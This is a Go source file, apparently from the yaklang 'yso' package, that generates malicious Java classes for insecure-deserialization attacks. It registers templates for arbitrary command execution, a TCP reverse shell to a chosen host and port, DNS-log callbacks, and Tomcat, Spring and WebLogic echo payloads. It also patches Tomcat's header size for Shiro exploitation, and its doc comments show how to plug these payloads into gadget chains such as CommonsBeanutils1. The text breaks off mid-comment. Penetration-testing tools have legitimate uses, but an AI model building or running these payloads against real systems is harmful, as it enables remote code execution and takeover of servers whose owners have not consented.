package yso

import (
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"strconv"
)

//type string string

const (
	RuntimeExecClass               = "RuntimeExecClass"
	ProcessBuilderExecClass        = "ProcessBuilderExecClass"
	ProcessImplExecClass           = "ProcessImplExecClass"
	DNSlogClass                    = "DNSlogClass"
	SpringEchoClass                = "SpringEchoClass"
	ModifyTomcatMaxHeaderSizeClass = "ModifyTomcatMaxHeaderSizeClass"
	EmptyClassInTemplate           = "EmptyClassInTemplate"
	TcpReverseClass                = "TcpReverseClass"
	TcpReverseShellClass           = "TcpReverseShellClass"
	TomcatEchoClass                = "TomcatEchoClass"
	BytesClass                     = "BytesClass"
	MultiEchoClass                 = "MultiEchoClass"
	HeaderEchoClass                = "HeaderEchoClass"
	SleepClass                     = "SleepClass"
	//NoneClass                                = "NoneClass"
)

type ClassPayload struct {
	ClassName string
	Help      string
	Generator func(*ClassConfig) (*javaclassparser.ClassObject, error)
}

var AllClasses = map[string]*ClassPayload{}

func GetAllClassGenerator() map[string]*ClassPayload {
	return AllClasses
}
func setClass(t string, help string, f func(*ClassConfig) (*javaclassparser.ClassObject, error)) {
	AllClasses[t] = &ClassPayload{
		ClassName: string(t),
		Help:      help,
		Generator: func(config *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := f(config)
			if err != nil {
				return nil, err
			}
			if config.ClassType != EmptyClassInTemplate {
				config.ConfigCommonOptions(obj)
			}
			return obj, nil
		},
	}
}

type ClassConfig struct {
	Errors     []error
	ClassType  string
	ClassBytes []byte
	//ClassTemplate *javaclassparser.ClassObject
	//public parameters
	ClassName     string
	IsObfuscation bool
	IsConstruct   bool
	//exec parameter
	Command      string
	MajorVersion uint16
	//dnslog parameters
	Domain string
	//spring parameters
	HeaderKey    string
	HeaderVal    string
	HeaderKeyAu  string
	HeaderValAu  string
	Param        string
	IsEchoBody   bool
	IsExecAction bool
	//Reverse parameters
	Host      string
	Port      int
	Token     string
	SleepTime int
}

func NewClassConfig(options ...GenClassOptionFun) *ClassConfig {
	o := ClassConfig{
		ClassName:     utils.RandStringBytes(8),
		IsObfuscation: true,
		IsConstruct:   false,
		IsEchoBody:    false,
		IsExecAction:  false,
	}
	obj := &o
	for _, option := range options {
		option(obj)
	}
	return obj
}
func (cf *ClassConfig) AddError(err error) {
	if err != nil {
		cf.Errors = append(cf.Errors, err)
	}
}
func (cf *ClassConfig) GenerateClassObject() (obj *javaclassparser.ClassObject, err error) {
	if cf.ClassType == BytesClass {
		obj, err = javaclassparser.Parse(cf.ClassBytes)
		if err != nil {
			return nil, err
		}
		return obj, nil
	}
	payload, ok := AllClasses[cf.ClassType]
	if !ok {
		return nil, utils.Errorf("not found class type: %s", cf.ClassType)
	}
	obj, err = payload.Generator(cf)
	if err != nil {
		return nil, err
	}
	if obj.MajorVersion != 0 {
		obj.MajorVersion = cf.MajorVersion
	}
	return obj, nil
}
func (cf *ClassConfig) ConfigCommonOptions(obj *javaclassparser.ClassObject) error {
	obj.SetClassName(cf.ClassName)
	if cf.IsConstruct == true {
		constant := obj.FindConstStringFromPool("Yes")
		if constant == nil {
			err := utils.Error("not found flag: Yes")
			log.Error(err)
			return err
		}
		constant.Value = "No"
	}
	if cf.IsObfuscation == true {

	}
	return nil
}

func init() {
	setClass(
		RuntimeExecClass,
		"Use the RuntimeExec command to execute",
		func(config *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_RuntimeExec)
			if err != nil {
				return nil, err
			}
			if config.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = config.Command
			return obj, nil
		},
	)
	setClass(
		ProcessImplExecClass,
		"Use the ProcessImpl command to execute the",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ProcessImplExec)
			if err != nil {
				return nil, err
			}
			if cf.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Command
			return obj, nil
		},
	)
	setClass(
		ProcessBuilderExecClass,
		"is executed using the ProcessBuilderExecClass command",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ProcessBuilderExec)
			if err != nil {
				return nil, err
			}
			if cf.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Command
			return obj, nil
		},
	)
	setClass(
		DNSlogClass,
		"dnslog detection",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_dnslog)
			if err != nil {
				return nil, err
			}
			if cf.Domain == "" {
				return nil, utils.Error("domain is empty")
			}
			constant := obj.FindConstStringFromPool("dns")
			if constant == nil {
				err = utils.Error("not found flag: dnslog")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Domain
			return obj, nil
		},
	)
	setClass(
		TcpReverseClass,
		"tcp reverse connection, which can be used for tcp outbound site vulnerability detection",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_TcpReverse)
			if err != nil {
				return nil, err
			}
			if cf.Host == "" || cf.Port == 0 {
				return nil, utils.Error("host or port is empty")
			}
			constant := obj.FindConstStringFromPool("HostVal")
			if constant == nil {
				err = utils.Error("not found flag: HostVal")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Host
			constant = obj.FindConstStringFromPool("Port")
			if constant == nil {
				err = utils.Error("not found flag: Port")
				log.Error(err)
				return nil, err
			}
			constant.Value = strconv.Itoa(cf.Port)
			if cf.Token != "" {
				constant = obj.FindConstStringFromPool("Token")
				if constant == nil {
					err = utils.Error("not found flag: Token")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.Token
			}
			return obj, nil
		},
	)
	setClass(
		TcpReverseShellClass,
		"tcp rebound shell",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_TcpReverseShell)
			if err != nil {
				return nil, err
			}
			if cf.Host == "" || cf.Port == 0 {
				return nil, utils.Error("host or port is empty")
			}
			constant := obj.FindConstStringFromPool("HostVal")
			if constant == nil {
				err = utils.Error("not found flag: HostVal")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Host
			constant = obj.FindConstStringFromPool("Port")
			if constant == nil {
				err = utils.Error("not found flag: Port")
				log.Error(err)
				return nil, err
			}
			constant.Value = strconv.Itoa(cf.Port)
			return obj, nil
		},
	)
	setClass(
		ModifyTomcatMaxHeaderSizeClass,
		"Modify the MaxHeaderSize of tomcat, generally used for shiro to use",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ModifyTomcatMaxHeaderSize)
			if err != nil {
				return nil, err
			}
			return obj, nil
		},
	)
	setClass(
		EmptyClassInTemplate,
		"is an empty class used for Template code execution.",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_EmptyClassInTemplate)
			if err != nil {
				return nil, err
			}

			return obj, nil
		},
	)
	setClass(
		BytesClass,
		"Custom bytecode, requires BASE64 encoding",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(cf.ClassBytes)
			if err != nil {
				return nil, err
			}
			return obj, nil
		},
	)
	setClass(
		TomcatEchoClass,
		"Echo",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_EchoByThread)
			if err != nil {
				return nil, err
			}
			javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				javaClassBuilder.SetValue("paramVal", cf.Param)
				javaClassBuilder.SetValue("postionVal", "body")
			} else {
				javaClassBuilder.SetValue("headerKeyv", cf.HeaderKey)
				javaClassBuilder.SetValue("headerValuev", cf.HeaderVal)
				javaClassBuilder.SetValue("postionVal", "header")
			}
			if cf.IsExecAction {
				javaClassBuilder.SetValue("actionVal", "exec")
			}
			if len(javaClassBuilder.GetErrors()) > 0 {
				log.Error(javaClassBuilder.GetErrors()[0])
				return nil, javaClassBuilder.GetErrors()[0]
			}
			return obj, nil
		},
	)
	setClass(
		MultiEchoClass,
		"Suitable for tomcat and weblogic echo",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_MultiEcho)
			if err != nil {
				return nil, err
			}
			javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				javaClassBuilder.SetValue("paramVal", cf.Param)
				javaClassBuilder.SetValue("postionVal", "body")
			} else {
				javaClassBuilder.SetValue("headerKeyv", cf.HeaderKey)
				javaClassBuilder.SetValue("headerValuev", cf.HeaderVal)
				javaClassBuilder.SetValue("postionVal", "header")
			}
			if cf.IsExecAction {
				javaClassBuilder.SetValue("actionVal", "exec")
			}
			if len(javaClassBuilder.GetErrors()) > 0 {
				log.Error(javaClassBuilder.GetErrors()[0])
				return nil, javaClassBuilder.GetErrors()[0]
			}
			return obj, nil
		},
	)
	setClass(
		SpringEchoClass,
		"Suitable for spring site echo",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_SpringEcho)
			if err != nil {
				return nil, err
			}
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				constant := obj.FindConstStringFromPool("paramVal")
				if constant == nil {
					err = utils.Error("not found flag: paramVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.Param
				constant = obj.FindConstStringFromPool("postionVal")
				if constant == nil {
					err = utils.Error("not found flag: postionVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = "body"
			} else {
				constant := obj.FindConstStringFromPool("HeaderKeyVal")
				if constant == nil {
					err = utils.Error("not found flag: HeaderKeyVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.HeaderKey
				constant = obj.FindConstStringFromPool("HeaderVal")
				if constant == nil {
					err = utils.Error("not found flag: HeaderVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.HeaderVal

			}
			if cf.IsExecAction {
				constant := obj.FindConstStringFromPool("actionVal")
				if constant == nil {
					err = utils.Error("not found flag: actionVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = "exec"
			}
			return obj, nil
		},
	)
	setClass(SleepClass, "sleep specifies the duration, used for delayed detection of gadgets", func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
		obj, err := javaclassparser.Parse(template_class_Sleep)
		if err != nil {
			return nil, err
		}
		javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
		javaClassBuilder.SetParam("time", strconv.Itoa(cf.SleepTime))
		if len(javaClassBuilder.GetErrors()) > 0 {
			log.Error(javaClassBuilder.GetErrors()[0])
			return nil, javaClassBuilder.GetErrors()[0]
		}
		return obj, nil
	})
	setClass(HeaderEchoClass, "automatically finds the Response object and echoes the specified content in the header.", func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
		obj, err := javaclassparser.Parse(template_class_HeaderEcho)
		if err != nil {
			return nil, err
		}
		javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
		javaClassBuilder.SetParam("aukey", cf.HeaderKeyAu)
		javaClassBuilder.SetParam("auval", cf.HeaderValAu)
		javaClassBuilder.SetParam("key", cf.HeaderKey)
		javaClassBuilder.SetParam("val", cf.HeaderVal)
		if len(javaClassBuilder.GetErrors()) > 0 {
			log.Error(javaClassBuilder.GetErrors()[0])
			return nil, javaClassBuilder.GetErrors()[0]
		}
		return obj, nil
	})
}

type GenClassOptionFun func(config *ClassConfig)

//var defaultOptions = []GenClassOptionFun{SetRandClassName(), SetObfuscation()}

//var templateOptions = []GenClassOptionFun{
//	SetClassRuntimeExecTemplate(),
//	SetClassSpringEchoTemplate(),
//	SetClassDnslogTemplate(),
//	SetClassModifyTomcatMaxHeaderSizeTemplate(),
//}

// SetClassName
// evilClassName request parameter option function, used to set the generated class name.
// className: The class name to be set.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
// ```
func SetClassName(className string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassName = className
	}
}

// SetConstruct
// useConstructorExecutor request parameter option function, used to set whether to use the constructor for execution.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.useConstructorExecutor())
// ```
func SetConstruct() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsConstruct = true
	}
}

// SetObfuscation
// obfuscationClassConstantPool request parameter option function, used to set whether to obfuscate the class constant pool.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.obfuscationClassConstantPool())
// ```
func SetObfuscation() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsObfuscation = true
	}
}

// SetBytesEvilClass
// useBytesEvilClass request parameter option function, passing in custom bytecode.
// data: Customized bytecode.
// Example:
// ```
// bytesCode,_ =codec.DecodeBase64(bytes)
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))
// ```
func SetBytesEvilClass(data []byte) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = BytesClass
		config.ClassBytes = data
	}
}

// SetClassBase64Bytes
// useBase64BytesClass request parameter option function, passing in the base64 encoded bytecode.
// base64: base64 encoded bytecode.
// Example:
// ```
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBase64BytesClass(base64Class))
// ```
func SetClassBase64Bytes(base64 string) GenClassOptionFun {
	bytes, err := codec.DecodeBase64(base64)
	if err != nil {
		log.Error(err)
		return nil
	}
	return SetClassBytes(bytes)
}

// SetClassBytes
// useBytesClass request parameter option function, passing in bytecode.
// data: bytecode.
// Example:
// ```
// bytesCode,_ =codec.DecodeBase64(bytes)
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))
// ```
func SetClassBytes(data []byte) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = BytesClass
		config.ClassBytes = data
	}
}

// LoadClassFromBytes Loads and returns a javaclassparser from the byte array .ClassObject object.
// This function uses GenerateClassObjectFromBytes as its implementation and allows the generated class object to be configured through the variable parameter `options`.
// These parameters are functions of type GenClassOptionFun, used to customize specific properties or behavior of the class object.
// bytes: The byte array from which the class object is to be loaded.
// options: List of variable parameter functions used to configure class objects.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// bytesCode,_ =codec.DecodeBase64("yv66vg...")
// classObject, _ := yso.LoadClassFromBytes(bytesCode) // loads and configures class objects from bytes.
// ```
func LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassObjectFromBytes(bytes, options...)
}

// LoadClassFromBase64 Loads and returns a javaclassparser.ClassObject object from a base64-encoded string.
// This function uses GenerateClassObjectFromBytes as its implementation and allows the generated class object to be configured through the variable parameter `options`.
// These parameters are functions of type GenClassOptionFun, used to customize specific properties or behavior of the class object.
// base64: The base64 encoded string to load the class object from.
// options: List of variable parameter functions used to configure class objects.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// classObject, _ := yso.LoadClassFromBytes("yv66vg...") // loads and configures class objects from bytes.
// ```
func LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := codec.DecodeBase64(base64)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

// LoadClassFromBCEL to BCEL (Byte Code Engineering Library) The Java class data in the format is converted into a byte array,
// and loads and returns a javaclassparser.ClassObject object from these bytes.
// This function first uses javaclassparser.Bcel2bytes to convert data in BCEL format, and then uses GenerateClassObjectFromBytes to generate a class object.
// You can customize specific properties or behavior of class objects through variable parameters `options`.
// data: Java class data in BCEL format.
// options: List of variable parameter functions used to configure class objects.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// bcelData := "$$BECL$$..." // assumed BCEL Data
// classObject, err := LoadClassFromBCEL(bcelData, option1, option2) // Loads and configures the class object from BCEL data
// ```
func LoadClassFromBCEL(data string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := javaclassparser.Bcel2bytes(data)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

func LoadClassFromJson(jsonData string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := codec.DecodeBase64(jsonData)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

// GenerateClassObjectFromBytes loads and returns a javaclassparser.ClassObject object from the byte array.
// LoadClassFromBytes, LoadClassFromBase64, LoadClassFromBCEL and other functions are all implemented based on this function.
// The parameter is a function of type GenClassOptionFun, which is used to customize specific attributes or behaviors of class objects.
// bytes: The byte array from which the class object is to be loaded.
// options: List of variable parameter functions used to configure class objects.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// bytesCode,_ =codec.DecodeBase64("yv66vg...")
// classObject, _ := yso.LoadClassFromBytes(bytesCode) // loads and configures class objects from bytes.
// ```
func GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassBytes(bytes))...)
	config.ClassType = BytesClass
	return config.GenerateClassObject()
}

// SetExecCommand
// command request parameter option function, used to set the command to be executed. Need to be used with useRuntimeExecTemplate.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
// ```
func SetExecCommand(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Command = cmd
	}
}

func SetMajorVersion(v uint16) GenClassOptionFun {
	// Defines the minimum and maximum major version number of the Java class file format 1.1 18
	const minMajorVersion uint16 = 45 //
	const maxMajorVersion uint16 = 62 //

	return func(config *ClassConfig) {
		if v < minMajorVersion || v > maxMajorVersion {
			v = 52
		}
		config.MajorVersion = v
	}
}

// SetClassRuntimeExecTemplate
// useRuntimeExecTemplate request parameter option function, which is used to set the template for generating the RuntimeExec class and needs to be used with command.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command("whoami"))
// ```
func SetClassRuntimeExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = RuntimeExecClass
	}
}

// SetRuntimeExecEvilClass
// useRuntimeExecEvilClass requests the parameter option function, sets the template to generate the RuntimeExec class, and sets the command to be executed.
// cmd: The command string to be executed.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
// ```
func SetRuntimeExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = RuntimeExecClass
		config.Command = cmd
	}
}

// GenerateRuntimeExecEvilClassObject to generate a javaclassparser.ClassObject object using the RuntimeExec class template,
// and set a specific command to execute. This function uses the SetClassRuntimeExecTemplate and SetExecCommand functions in combination,
// to generate Java objects that perform specific commands when deserialized.
// cmd: the command string to be executed in the generated Java object.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// command := "ls" // Hypothetical command string
// classObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...) // generates and configures the RuntimeExec Java object
// ```
func GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassRuntimeExecTemplate(), SetExecCommand(cmd))...)
	config.ClassType = RuntimeExecClass
	return config.GenerateClassObject()
}

// SetClassProcessBuilderExecTemplate
// useProcessBuilderExecTemplate request parameter option function, used to set the template to generate the ProcessBuilderExec class, and needs to be used with command.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
// ```
func SetClassProcessBuilderExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessBuilderExecClass
	}
}

// SetProcessBuilderExecEvilClass
// useProcessBuilderExecEvilClass to request the parameter option function, set the template to generate the ProcessBuilderExec class, and set the command to be executed.
// cmd: The command string to be executed.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
// ```
func SetProcessBuilderExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessBuilderExecClass
		config.Command = cmd
	}
}

// GenerateProcessBuilderExecEvilClassObject generates a javaclassparser.ClassObject object using the ProcessBuilderExec class template,
// and sets a specified command to execute. This function uses the SetClassProcessBuilderExecTemplate and SetExecCommand functions in combination,
// to generate Java objects that perform specific commands when deserialized.
// cmd: the command string to be executed in the generated Java object.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// command := "ls" // Hypothetical command string
// classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // Generates and configures the ProcessBuilderExec Java object
// ```
func GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassProcessBuilderExecTemplate(), SetExecCommand(cmd)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// SetClassProcessImplExecTemplate
// useProcessImplExecTemplate request parameter option function, which is used to set the template for generating the ProcessImplExec class. It needs to be used with command.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
// ```
func SetClassProcessImplExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessImplExecClass
	}
}

// SetProcessImplExecEvilClass
// useProcessImplExecEvilClass request parameter option function, set the template to generate the ProcessImplExec class, and set the command to be executed.
// cmd: The command string to be executed.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
// ```
func SetProcessImplExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessImplExecClass
		config.Command = cmd
	}
}

// GenerateProcessImplExecEvilClassObject generates a javaclassparser.ClassObject object using the ProcessImplExec class template.
// and sets a specified command to execute. This function uses the SetClassProcessImplExecTemplate and SetExecCommand functions in combination.
// to generate Java objects that perform specific commands when deserialized.
// cmd: the command string to be executed in the generated Java object.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// command := "ls" // Hypothetical command string
// classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // Generate and configure ProcessImplExec Java object
// ```
func GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassProcessImplExecTemplate(), SetExecCommand(cmd)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// SetClassDnslogTemplate
// useDnslogTemplate request parameter option function, used to set the template for generating Dnslog class, needs to be used in conjunction with dnslogDomain.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
// ```
func SetClassDnslogTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = DNSlogClass
	}
}

// SetDnslog
// dnslogDomain request parameter option function, sets the specified Dnslog domain name, and needs to be used in conjunction with useDnslogTemplate.
// addr: Dnslog domain name to be set.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
// ```
func SetDnslog(addr string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Domain = addr
	}
}

// SetDnslogEvilClass
// useDnslogEvilClass request parameter option function, set the template to generate Dnslog class, and set the specified Dnslog domain name.
// addr: Dnslog domain name to be set.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
// ```
func SetDnslogEvilClass(addr string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = DNSlogClass
		config.Domain = addr
	}
}

// GenDnslogClassObject
// GenerateDnslogEvilClassObject generates a javaclassparser.ClassObject object using the Dnslog class template.
// and sets a specified Dnslog domain name. This function uses the useDNSlogTemplate and dnslogDomain functions in combination.
// for tomcat to generate a Java object that when deserialized will send a request to the specified Dnslog domain name.
// domain: The Dnslog domain name to be requested in the generated Java object.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// domain := "dnslog.com" // Assumed Dnslog domain name
// classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // generates and configures the Dnslog Java object
// ```
func GenDnslogClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassDnslogTemplate(), SetDnslog(domain)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// SetClassSpringEchoTemplate
// useSpringEchoTemplate request parameter option function, used to set the template to generate the SpringEcho class. It needs to be used with springHeader or springParam.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
// ```
func SetClassSpringEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = SpringEchoClass
	}
}

// SetHeader
// springHeader request parameter option function sets the specified header key-value pair and needs to be used in conjunction with useSpringEchoTemplate.
// It should be noted that when sending the Payload generated by this function, you need to set the header: Accept-Language: zh-CN,zh;q=1.9 to trigger echo.
// key: The header key to be set.
// val: header value to be set.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
// ```
func SetHeader(key string, val string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.HeaderKey = key
		config.HeaderVal = val
		config.HeaderKeyAu = "Accept-Language"
		config.HeaderValAu = "zh-CN,zh;q=1.9"
	}
}

// SetParam
// springParam request parameter option function to set the specified echo value and needs to be used in conjunction with useSpringEchoTemplate.
// param: the request parameter to be set.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
// ```
func SetParam(val string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Param = val
	}
}

// SetExecAction
// springRuntimeExecAction request parameter option function to set whether to execute the command.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
// ```
func SetExecAction() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsExecAction = true
	}
}

// SetEchoBody
// springEchoBody request parameter option function to set whether to echo in the body.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
// ```
func SetEchoBody() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsEchoBody = true
	}
}

// GenerateSpringEchoEvilClassObject generates a javaclassparser.ClassObject object using the SpringEcho class template,
// This function uses the useSpringEchoTemplate and springParam functions together to generate a Java object that will echo the specified content when deserialized.
// options: A set of optional GenClassOptionFun functions for further customizing the generated Java object.
// Returns: javaclassparser.ClassObject object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // Generates and configures SpringEcho Java objects
// ```
func GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassSpringEchoTemplate())...)
	return config.GenerateClassObject()
}

// SetClassModifyTomcatMaxHeaderSizeTemplate
// useModifyTomcatMaxHeaderSizeTemplate request parameter option function, used to set the template to generate the ModifyTomcatMaxHeaderSize class.
// is generally used by shiro to modify the MaxHeaderSize value of tomcat.
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
// ```
func SetClassModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ModifyTomcatMaxHeaderSizeClass
	}
}

// GenerateModifyTomcatMaxHeaderSizeEvilClassObject generates a javaclassparser.ClassObject object using the ModifyTomcatMaxHeaderSize class template,
